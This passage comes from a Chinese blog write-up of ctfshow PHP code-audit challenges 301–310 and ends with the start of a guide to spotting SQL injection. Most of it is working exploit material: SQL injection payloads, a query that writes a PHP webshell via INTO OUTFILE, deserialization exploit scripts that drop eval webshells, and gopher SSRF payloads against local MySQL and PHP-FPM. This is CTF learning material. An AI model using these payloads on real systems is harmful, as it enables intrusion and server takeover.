传入了<code>CheckPl_all()</code>函数, 可见这里的参数都没有调用过滤函数进行处理, 但是好在都对这些参数使用了int类型强制类型转换; 所以比较安全</p><p>然后我们开始刷一下ctfshow的题目301-310</p><h3 id="做几个题"><a href="#做几个题" class="headerlink" title="做几个题"></a>做几个题</h3><h4 id="301"><a href="#301" class="headerlink" title="301"></a>301</h4><p>映入眼帘一个登陆框, 猜测存在SQL注入<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303182017481.png" alt="image-20230318201723336"></p><p>果然, 毫无过滤的一个SQL注入漏洞, 然后这里第二个<code>if</code>判断</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">strcasecmp</span>(<span class="variable">$userpwd</span>,<span class="variable">$row</span>[<span class="string">&#x27;sds_password&#x27;</span>]))&#123;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]=<span class="number">1</span>;</span><br><span class="line">	<span class="variable">$result</span>-&gt;<span class="title function_ invoke__">free</span>();</span><br><span class="line">	<span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&quot;location:index.php&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>检查<code>$userpwd</code>变量是否与<code>$row[&#39;sds_password&#39;]</code>变量相等, 如果相等, 则设置一个名为<code>$_SESSION[&#39;login&#39;]</code>的session变量为1</p><p>代码第一行使用<code>strcasecmp()</code>函数比较<code>$userpwd</code> , <code>$row[&#39;sds_password</code>两个变量, 该函数比较两个字符串返回一个整数, 表示两个字符串的相对大小. 如果两个字符串相同则会返回0, 继续执行<code>$_SESSION[&#39;login&#39;]=1;</code>并释放查询结果 <code>$result</code>，关闭 MySQL 数据库连接 <code>$mysqli</code>，然后将页面重定向到 <code>index.php</code></p><p>这里我们payload是:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1;#</span></span><br><span class="line"><span class="string">1</span></span><br></pre></td></tr></table></figure><p>这样我们查询的结果就是<code>1</code>, 然后密码也设为<code>1</code>即可, 当然也可以是2</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303182048998.png" alt="image-20230318204821967"></p><p>即可登录成功, 拿到flag</p><h4 id="302"><a href="#302" class="headerlink" title="302"></a>302</h4><p>这题就只是修改了一个地方而已</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303182236359.png" alt="image-20230318223652309"></p><p>多了一个加密方法, 将用户输入的密码进行了一个解码, 那么我们人工将已经解码的<code>sds_password</code>输入进去, 那么两个变量还是相等的, 当然我们也可以将输入的<code>userowd</code>编码一下再输入进去, 但是那样是逆向的很明显要复杂很多</p><p>我们按住<code>CTRL</code>鼠标左键点一下<code>sds_decode</code>函数, 就能看见解码函数<code>fun.php</code></p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303182255974.png" alt="image-20230318225522896"></p><p>这个脚本也就是我们的exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$str</span>.<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;sds&quot;</span>))).<span class="string">&quot;sds&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最终payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span><span class="string">&#x27; union select &#x27;</span>f977952c679ca39837adaba7778c288b<span class="string">&#x27;;#</span></span><br><span class="line"><span class="string">2</span></span><br></pre></td></tr></table></figure><h5 id="写入一句话木马"><a href="#写入一句话木马" class="headerlink" title="写入一句话木马"></a>写入一句话木马</h5><p>这两题都可以采用写入一句话木马的方法解决, 这样就可以无视php的逻辑, 直接写入</p><p>这里直接放payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">userid<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select &quot;&lt;?php eval($_POST[1]); ?&gt;&quot; into outfile &quot;/var/www/html/1.php&quot;%23&amp;userpwd=1</span></span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303182305935.png" alt="image-20230318230540885"></p><p>然后我们直接访问<code>1.php</code>, 然后就拿到shell了</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303182306190.png" alt="image-20230318230634126"></p><h4 id="303"><a href="#303" class="headerlink" title="303"></a>303</h4><p>这题又增加了限制, 限制用户名长度小于6<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303182336268.png" alt="image-20230318233606240"></p><p>那么我们之前的方法就不适用了</p><p>我们继续看下面的文件, 到了这个<code>dptadd.php</code>, 再次发现SQL语句, 是insert<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303182337455.png" alt="image-20230318233757326"></p><p>但是这个php文件, 我们无法直接访问, 需要登录后才可以, 这里有一个sql文件, 我们打开看一下, 发现了特别像密码的东西.<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303182341184.png" alt="image-20230318234129044"></p><p>但是根据上一题经验, 这里的密码也应该是编码过的, 我们再去<code>fun.php</code>看一下, 运行刚好是那串字符串<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303182343056.png" alt="image-20230318234341919"></p><p>那么账号密码就应该是admin,admin; 当然这里爆破弱口令似乎也是可以的</p><p>这里直接贴一下payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dpt_name<span class="operator">=</span><span class="number">123</span><span class="string">&#x27;,sds_address=(select group_concat(table_name) from information_schema.tables where table_schema=database())%23&amp;dpt_address=123&amp;dpt_build_year=2023-03-01&amp;dpt_has_cert=on&amp;dpt_cert_number=123&amp;dpt_telephone_number=123</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">dpt_name=123&#x27;</span>,sds_address<span class="operator">=</span>(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;sds_fl9g&#x27;</span>)<span class="operator">%</span><span class="number">23</span><span class="operator">&amp;</span>dpt_address<span class="operator">=</span><span class="number">123</span><span class="operator">&amp;</span>dpt_build_year<span class="operator">=</span><span class="number">2023</span><span class="number">-03</span><span class="number">-01</span><span class="operator">&amp;</span>dpt_has_cert<span class="operator">=</span><span class="keyword">on</span><span class="operator">&amp;</span>dpt_cert_number<span class="operator">=</span><span class="number">123</span><span class="operator">&amp;</span>dpt_telephone_number<span class="operator">=</span><span class="number">123</span></span><br><span class="line"></span><br><span class="line">dpt_name<span class="operator">=</span><span class="number">123</span><span class="string">&#x27;,sds_address=(select flag from sds_fl9g)%23&amp;dpt_address=123&amp;dpt_build_year=2023-03-01&amp;dpt_has_cert=on&amp;dpt_cert_number=123&amp;dpt_telephone_number=123</span></span><br></pre></td></tr></table></figure><p>我们只需要抓一个<code>dptadd.php</code>的包</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303182354844.png" alt="image-20230318235426791"></p><p>最终的查询结果就可以在<code>dpt.php</code>界面显示出来<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303182355714.png" alt="image-20230318235500652"></p><h4 id="304"><a href="#304" class="headerlink" title="304"></a>304</h4><p>增加了全局waf</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sds_waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]|-/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是好像并没有什么用, 貌似是源代码里没有用上waf, 我们继续试一下上题的payload,</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303192113963.png" alt="image-20230319211342829"></p><p>这里只是换了个表名, 但是payload仍然适用</p><h4 id="305"><a href="#305" class="headerlink" title="305"></a>305</h4><p>这里介绍一个比较好用的工具, <code>seay源码审计系统</code></p><p>我们把文件夹在里边打开直接点击自动审计即可<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303192151136.png" alt="image-20230319215153061"></p><p>我们先看一下这个sql注入, 会发现这里套了waf, 那很明显前面的SQL注入就不能用了<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303192152114.png" alt="image-20230319215258043"></p><p>那么我们尝试利用一下这个反序列化漏洞</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303192159449.png" alt="image-20230319215952311"></p><p>这里有个<code>file_put_contents</code>, 那么反序列化入口点在哪呢, 我们可以搜一下<code>user</code>试试</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303192202888.png" alt="image-20230319220233850"></p><p>可以看出<code>cookie</code>是反序列化入口, 我们先构造一个一句话木马试一试<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303192203294.png" alt="image-20230319220302158"></p><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;1.php&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行得到结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>user%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>username%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">221</span>.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>password%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A24%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">3</span>C%<span class="number">3</span>Fphp+<span class="keyword">eval</span>%<span class="number">28</span>%<span class="number">24</span>_POST%<span class="number">5</span>B1%<span class="number">5</span>D%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">3</span>F%<span class="number">3</span>E%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><p>这里还是需要我们登录后才能利用的, 所以我们要首先利用弱口令登录, 然后访问<code>checklogin.php</code>通过<code>cookie</code>发包</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303212033829.png" alt="image-20230321203258701"></p><p>连蚁剑并没有发现flag, 但是存在数据库, 我们猜测flag在数据库里<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303212036142.png" alt="image-20230321203600089"></p><h4 id="306"><a href="#306" class="headerlink" title="306"></a>306</h4><p>扫一下, 又在<code>class.php</code>里发现了漏洞<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303212246566.png" alt="image-20230321224658471"></p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303212252416.png" alt="image-20230321225242370"></p><p>然后我们再找一下<code>close()</code>, 然后在<code>dao.php</code>中找到了<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303212255531.png" alt="image-20230321225507395"></p><p>我们构造一下exp.php</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303221525686.png" alt="image-20230322152532491"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$conn</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;conn=<span class="keyword">new</span> <span class="title function_ invoke__">log</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">log</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$title</span>=<span class="string">&#x27;1.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$info</span>=<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">dao</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>执行exp结果:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TzozOiJkYW8iOjE6e3M6OToiAGRhbwBjb25uIjtPOjM6ImxvZyI6Mjp7czo1OiJ0aXRsZSI7czo1OiIxLnBocCI7czo0OiJpbmZvIjtzOjI0OiI8P3BocCBldmFsKCRfUE9TVFsxXSk7Pz4iO319</span><br></pre></td></tr></table></figure><p>访问<code>index.php</code>并添加<code>user</code>cookie</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303221532442.png" alt="image-20230322153252375"></p><p>写入木马文件<code>1.php</code><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303221533539.png" alt="image-20230322153356475"></p><h4 id="307"><a href="#307" class="headerlink" title="307"></a>307</h4><p>用工具扫一下, 扫出<code>shell_exec</code>可能存在任意命令执行漏洞<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303221923809.png" alt="image-20230322192359768"></p><p>这里先找一下<code>clearCache</code>, 可以全局搜索一下, 在logout.php中, 发现了可利用点<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303221925594.png" alt="image-20230322192543459"></p><p>再看一下<code>cache_dir</code>, 在<code>config</code>类里<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303221927890.png" alt="image-20230322192721758"></p><p>这次我们从<code>logout.php</code>写<code>service</code>cookie, 写入一句话木马php文件</p><p>访问<code>http://url/controller/1.php</code></p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303222036762.png" alt="image-20230322203615656"></p><h4 id="308"><a href="#308" class="headerlink" title="308"></a>308</h4><p>上题利用的漏洞已经被修复了, 但是<code>fun.php</code>里多了一个ssrf利用点<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303222120723.png" alt="image-20230322212005877"></p><p>在<code>dao.php</code>中发现被调用<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303222236394.png" alt="image-20230322223652256"></p><p>又在<code>index.php</code>中找到利用点<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303222241950.png" alt="image-20230322224124783"></p><p>然后我们发现数据库密码为空, 这里我们可以想到使用gopher打MySQL<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303231311585.png" alt="image-20230323131134417"></p><p>利用gopherus生成，地址<a class="link" target="_blank" rel="noopener" href="https://github.com/tarunkant/Gopherus![image-20230323131716266](https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303231317501.png)">https://github.com/tarunkant/Gopherus![image-20230323131716266](https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303231317501.png)<i class="fas fa-external-link-alt"></i></a></p><p>可以构造出最终exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config=<span class="keyword">new</span> <span class="title function_ invoke__">config</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">config</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$update_url</span>=<span class="string">&#x27;gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%45%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%31%2e%70%68%70%22%01%00%00%00%01&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">dao</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问首页并写入payload</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303231347831.png" alt="image-20230323134729781"></p><h4 id="309"><a href="#309" class="headerlink" title="309"></a>309</h4><p>这题提到说MySQL有密码了, 那我们就没法利用3306端口了, 可以先通过file协议读一下配置文件, 看看有没有其他利用点, 可以看到是nginx<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303231418608.png" alt="image-20230323141848567"></p><p>poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config=<span class="keyword">new</span> <span class="title function_ invoke__">config</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">config</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$update_url</span>=<span class="string">&#x27;file:///etc/nginx/nginx.conf&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">dao</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303231427894.png" alt="image-20230323142709837"></p><p>发现这里开放了9000端口, 我们可以尝试打一下<code>fastcgi</code></p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303231451022.png" alt="image-20230323145142784"></p><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config=<span class="keyword">new</span> <span class="title function_ invoke__">config</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">config</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$update_url</span> = <span class="string">&#x27;gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%00%F6%06%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH93%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%09SCRIPT_FILENAMEindex.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%5D%04%00%3C%3Fphp%20system%28%27%20echo%20%22%3C%3Fphp%20eval%28%5C%24_POST%5B1%5D%29%3B%3F%3E%22%20%3E%201.php%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">dao</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="310"><a href="#310" class="headerlink" title="310"></a>310</h4><p>像上题一样, 先读一下配置文件看看有没有什么蹊跷, 这里9000端口仍然开放, 我们再尝试打一下试试</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303231904011.png" alt="image-20230323190405939"></p><p>可以成功读取<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303231909584.png" alt="image-20230323190931517"></p><p>这题我们还会发现配置文件里还有另一个端口, 4476, 可以直接利用这个端口</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303231500905.png" alt="image-20230323150022849"></p><p>直访问</p><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config=<span class="keyword">new</span> <span class="title function_ invoke__">config</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">config</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$update_url</span> = <span class="string">&#x27;http://127.0.0.1:4476&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">dao</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>拿到flag<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303231502308.png" alt="image-20230323150223253"></p><h3 id="常见漏洞审计方法总结"><a href="#常见漏洞审计方法总结" class="headerlink" title="常见漏洞审计方法总结"></a>常见漏洞审计方法总结</h3><h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h4><p>首先了解SQL注入常见的业务场景与漏洞类型</p><ul><li>用户登录</li><li>数据搜索</li><li>获取HTTP头</li><li>商品购买(insert/update注入)</li><li>信息查询</li></ul><p>可以说, 任何与数据库进行交互的地方都可能存在SQL注入, 对于其漏洞存在场景也是多种多样</p><p>对于SQL注入最首先要关注的就是数据库操作的关键字</p><p>在原生PHP代码中要多关注这些</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span></span><br><span class="line">mysqli_connect</span><br><span class="line">mysqli_query</span><br><span class="line">mysqli_fetch_row</span><br><span class="line">mysqli_fetch_array</span><br><span class="line"><span class="keyword">update</span></span><br><span class="line">indert <span class="keyword">into</span></span><br><span class="line"><span class="keyword">delete</span></span><br></pre></td></tr></table></figure><p>在CMS或者框架中,需要多关注下面这些</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">name</span>()</span><br><span class="line"><span class="title function_ 